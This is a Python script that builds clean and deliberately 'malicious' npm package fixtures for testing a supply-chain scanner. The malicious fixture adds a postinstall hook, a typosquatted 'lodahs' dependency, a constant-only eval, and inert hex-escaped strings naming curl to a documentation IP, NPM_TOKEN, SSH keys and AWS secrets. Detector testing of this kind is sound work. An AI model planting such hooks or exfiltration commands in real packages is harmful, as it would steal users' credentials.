"""Generate the clean and malicious test fixtures deterministically.

    python tests/fixtures/build_fixtures.py

Each fixture gets ``source/`` (the "git repo"), ``package.tgz`` (the "published" tarball)
and ``registry.json`` (fake npm registry metadata with the correct integrity values).

The malicious fixture is HARMLESS. ``lib/x.min.js`` holds only inert string literals that
imitate the shape of an exfiltration payload (child_process, a documentation-range IP
203.0.113.7, curl, NPM_TOKEN); nothing in it calls, imports or runs anything, and the
added ``eval`` in dist/index.js only evaluates a constant expression.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import io
import json
import shutil
import tarfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
NPM_MTIME = 499162500  # the fixed mtime npm itself writes into tarballs (1985-10-26)
NAME, VERSION = "tiny-percent", "1.0.0"
TARBALL_URL = f"https://registry.npmjs.org/{NAME}/-/{NAME}-{VERSION}.tgz"

SOURCE_MANIFEST = {
    "name": NAME,
    "version": VERSION,
    "description": "Percent helpers (IntAnalyze test fixture)",
    "main": "dist/index.js",
    "types": "dist/index.d.ts",
    "files": ["dist"],
    "scripts": {"build": "tsc", "test": "node --test"},
    "repository": {
        "type": "git",
        "url": "git+https://github.com/intanalyze-fixtures/tiny-percent.git",
    },
    "license": "MIT",
    "devDependencies": {"typescript": "^5.4.0"},
}

README = "# tiny-percent\n\nPercent helpers. This is an IntAnalyze test fixture.\n"
LICENSE = (
    "MIT License\n\nCopyright (c) 2026 IntAnalyze fixtures\n\n"
    "Permission is hereby granted, free of charge, to any person obtaining a copy of this "
    "software, to deal in the Software without restriction.\n"
)

SOURCE_FILES = {
    "src/util.ts": (
        "export function clamp(value: number, min: number, max: number): number {\n"
        "  return Math.min(Math.max(value, min), max);\n"
        "}\n"
    ),
    "src/index.ts": (
        'import { clamp } from "./util";\n\n'
        "export function percent(part: number, total: number): number {\n"
        "  if (total === 0) return 0;\n"
        "  return clamp(Math.round((part / total) * 100), 0, 100);\n"
        "}\n\n"
        "export { clamp };\n"
    ),
    "test/index.test.ts": (
        'import { test } from "node:test";\n'
        'import assert from "node:assert";\n'
        'import { percent } from "../src/index";\n\n'
        'test("percent", () => assert.equal(percent(1, 4), 25));\n'
    ),
    "tsconfig.json": json.dumps(
        {
            "compilerOptions": {
                "target": "ES2020",
                "module": "commonjs",
                "declaration": True,
                "outDir": "dist",
                "strict": True,
            },
            "include": ["src"],
        },
        indent=2,
    )
    + "\n",
    "README.md": README,
    "LICENSE": LICENSE,
}

DIST_INDEX = (
    '"use strict";\n'
    'Object.defineProperty(exports, "__esModule", { value: true });\n'
    "exports.clamp = void 0;\n"
    "exports.percent = percent;\n"
    'const util_1 = require("./util");\n'
    'Object.defineProperty(exports, "clamp", { enumerable: true, get: function () '
    "{ return util_1.clamp; } });\n"
    "function percent(part, total) {\n"
    "    if (total === 0)\n"
    "        return 0;\n"
    "    return (0, util_1.clamp)(Math.round((part / total) * 100), 0, 100);\n"
    "}\n"
)
DIST_FILES = {
    "dist/index.js": DIST_INDEX,
    "dist/index.d.ts": (
        'import { clamp } from "./util";\n'
        "export declare function percent(part: number, total: number): number;\n"
        "export { clamp };\n"
    ),
    "dist/util.js": (
        '"use strict";\n'
        'Object.defineProperty(exports, "__esModule", { value: true });\n'
        "exports.clamp = clamp;\n"
        "function clamp(value, min, max) {\n"
        "    return Math.min(Math.max(value, min), max);\n"
        "}\n"
    ),
    "dist/util.d.ts": (
        "export declare function clamp(value: number, min: number, max: number): number;\n"
    ),
}

# (c) an extra eval( in the build output. It only evaluates a constant.
MALICIOUS_DIST_INDEX = (
    DIST_INDEX + 'var __cfg = eval("(" + JSON.stringify({ debug: false }) + ")");\n'
)


def _hex_escape(s: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in s)


def inert_payload() -> str:
    """(b) A one-line, obfuscated-looking file made only of unused string literals."""
    words = [
        "child_process", "execSync", "curl -s http://203.0.113.7/collect",
        "process.env.NPM_TOKEN", "~/.npmrc", "~/.ssh/id_rsa", "AWS_SECRET_ACCESS_KEY",
    ]
    escaped = ",".join(f'"{_hex_escape(w)}"' for w in words)
    note = (
        "This is an inert IntAnalyze test fixture. It contains no executable payload. "
    ) * 4
    b64 = base64.b64encode(note.encode()).decode().rstrip("=")
    hexblob = hashlib.sha512(b"intanalyze-fixture").hexdigest() * 2
    return (
        "/* IntAnalyze test fixture - INERT: only unused string literals, nothing is called. */\n"
        f'var _0x5f2a=[{escaped}],_0x3c1b="{b64}",_0x7d4e="{hexblob}",'
        '_0x9a0f=["child_process","http://203.0.113.7/collect","curl -s 203.0.113.7"];\n'
    )


def write_tree(root: Path, files: dict[str, str]) -> None:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")


def make_tgz(files: dict[str, str]) -> bytes:
    """Deterministic npm-style tarball: package/ prefix, sorted, fixed mtimes and owners."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.USTAR_FORMAT) as tar:
        for rel in sorted(files):
            data = files[rel].encode("utf-8")
            info = tarfile.TarInfo(f"package/{rel}")
            info.size = len(data)
            info.mtime = NPM_MTIME
            info.mode = 0o644
            info.uid = info.gid = 0
            info.uname = info.gname = ""
            tar.addfile(info, io.BytesIO(data))
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb", mtime=0, compresslevel=9) as gz:
        gz.write(raw.getvalue())
    return out.getvalue()


def registry_metadata(manifest: dict, tgz: bytes) -> dict:
    meta = dict(manifest)
    meta["dist"] = {
        "tarball": TARBALL_URL,
        "integrity": "sha512-" + base64.b64encode(hashlib.sha512(tgz).digest()).decode(),
        "shasum": hashlib.sha1(tgz).hexdigest(),
    }
    return meta


def build(name: str, package_files: dict[str, str], manifest: dict) -> None:
    root = HERE / name
    if root.exists():
        shutil.rmtree(root)
    write_tree(root / "source", {**SOURCE_FILES, "package.json": _dump(SOURCE_MANIFEST)})
    tgz = make_tgz({**package_files, "package.json": _dump(manifest)})
    (root / "package.tgz").write_bytes(tgz)
    (root / "registry.json").write_text(_dump(registry_metadata(manifest, tgz)), encoding="utf-8")


def _dump(data: dict) -> str:
    return json.dumps(data, indent=2) + "\n"


def main() -> None:
    common = {**DIST_FILES, "README.md": README, "LICENSE": LICENSE}
    build("clean", common, SOURCE_MANIFEST)

    evil_manifest = json.loads(json.dumps(SOURCE_MANIFEST))
    evil_manifest["scripts"]["postinstall"] = "node lib/x.min.js"  # (a)
    evil_manifest["dependencies"] = {"lodahs": "^4.17.21"}  # (d) typosquat of lodash
    build(
        "malicious",
        {**common, "dist/index.js": MALICIOUS_DIST_INDEX, "lib/x.min.js": inert_payload()},
        evil_manifest,
    )
    print(f"fixtures written to {HERE}")


if __name__ == "__main__":
    main()
